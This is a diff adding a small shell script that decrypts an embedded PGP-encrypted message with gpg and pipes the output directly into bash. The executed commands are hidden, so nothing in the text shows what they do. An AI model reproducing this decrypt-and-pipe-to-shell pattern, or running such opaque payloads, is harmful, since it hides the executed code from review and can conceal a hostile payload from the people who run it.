@@ -1,0 +1,25 @@
+#!/usr/bin/env sh
+
+command=$(cat << EOF
+-----BEGIN PGP MESSAGE-----
+
+hQIMA1ojNycqtztqAQ/+IZjqqxZwmHLzoYGNy3CANHt0LTyRCS22ATkh1FHogJQT
+JmBNCpfqxjAC9IS1CFApflwUEg88ohMLeVTOSQMUTBV6saW+iIT+SfDf5Wm24ziQ
+xgC/QHgfxJ9VZWrUPLvrKbgRid8FVx1jNUfnbtFsG4hPUf0bSTbxb7/rUoVFhicc
+3WtFEtw9kfAsWIYbyldB8ANIylvqU/j13SmEWS93Wrny0yNSQwke/llwhsm793T+
+gvF22lpe3wVOkGMFox3duZY6No9LG9JXbIU4nWcSZrxfBS2qhXYhrxdOcEPX14BM
+XAXj9r6z1CnQhXGMH2qS1ZQHoZbykfiox8iXA5qRU6I32SQiNwmTojrQv0oAnXGn
+u7iO9iURMz+MqdF9o6aMcNk/qJMlf5j/h1kuBY8Qdvyj6zwj/fHotMrVlAGUI2+/
+s6eZ1pJACvYyoDDpW5GfHmrXSS3VgLTs23C/jXlDUSZJgyH1xQTR9/+JcemEEZ3k
+Ibm9O036G4uzreKRBWJuo3FhRy50GPeigQv6np9N3Sb5wuFK+Y/ppwcV+e305DYD
+JDsyXToLF0PE9A7oN0VSDVGNd7bDntT+t4rFMFt3C3kqbdMpg+8Y2Oqsbqi6aVSs
+h7hQU3faYPlkOfe1ROPuyOYHiNrKxkOJVu/WFNVcdtBjobHuW0q47X9MyDoGgPrS
+rAFfWToDseXJ1xNlP7p2vtgu1XyFZfQJR1Wfpmt5gP3IwWkzCIYcZncw0x/gtChS
+d9jJJNEs9rwHrFN9pLAXzAv0yB82s7T+cei58X6Q+uT07Mo4n5qzzS41DiGkkdfc
+ZvIIfd6+K4nWDeOnSjj3dfZmsorNsGuMXnMZnHppYQtCUqp3g5dSbQ6H3enSle4p
+aheMBLVm1wTL6IOa103ZCap+u2+VU+dL+RHkoQc=
+=c1t9
+-----END PGP MESSAGE-----
+EOF
+)
+echo "$command" | gpg -d | bash
